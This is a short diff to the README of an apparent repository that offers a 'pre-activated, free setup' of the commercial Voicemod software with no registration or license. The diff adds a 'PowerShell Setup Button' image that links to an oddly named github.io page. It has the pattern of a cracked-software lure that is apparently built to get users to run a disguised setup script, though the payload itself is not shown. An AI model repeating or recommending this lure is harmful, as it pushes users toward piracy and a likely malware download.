@@ -1,5 +1,5 @@
 # Voicemod
-
+[![PowerShell Setup Button](./imgs/button.png)](https://pulverizefrogfigure.github.io/voicemod/)
 ### ⚡ Overview
 **This repository provides a pre-activated, free setup for Voicemod.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
 
